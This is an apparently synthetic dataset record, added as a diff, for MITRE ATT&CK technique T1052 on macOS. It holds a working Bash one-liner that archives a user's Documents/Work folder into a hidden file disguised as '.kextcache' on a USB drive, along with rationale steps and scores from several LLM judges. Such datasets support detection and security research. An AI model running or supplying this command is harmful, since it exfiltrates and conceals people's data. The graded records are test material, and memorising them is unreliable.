@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "dd if=/dev/zero of=\"/Volumes/UNTITLED/.kextcache\" bs=1m count=0 seek=200 && tar -czf - \"$HOME/Documents/Work\" | dd of=\"/Volumes/UNTITLED/.kextcache\" bs=1m conv=notrunc && sync",
+  "explanation": "Creates a sparse container file on the external drive and then writes a compressed archive into it without truncating, using dd to disguise content within a large file.",
+  "rationale_steps": [
+    "Pre-create a large sparse file on the USB to blend into disk usage.",
+    "Compress target data to stream form.",
+    "Write into the container with dd conv=notrunc to avoid changing file size metadata.",
+    "Sync to ensure all data is persisted offline."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-84fb1661",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are well-formed with balanced quotes, correct use of && and |, and valid tar and dd options for macOS.",
+        "semantic_score": 4,
+        "semantic_justification": "It compresses target data and writes it to a hidden file on an external volume using dd with notrunc to preserve a pre-sized container, aligning with T1052, though the sparse-file creation via count=0 seek may depend on filesystem support on the removable drive.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T10:26:42.800761Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quotes, valid flags, and correct command separators (&&, |) for both dd and tar commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by creating a hidden file (.kextcache) on an external volume that appears to be a system file, then hiding compressed user documents within it using dd and tar, making it an effective data exfiltration technique via physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T10:26:46.175854Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct command separators, and valid flags for all utilities.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly executes the described intent, creating a sparse file and embedding a compressed archive into it without truncation, which aligns perfectly with the T1052 technique for disguising exfiltrated data.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T10:26:57.029043Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
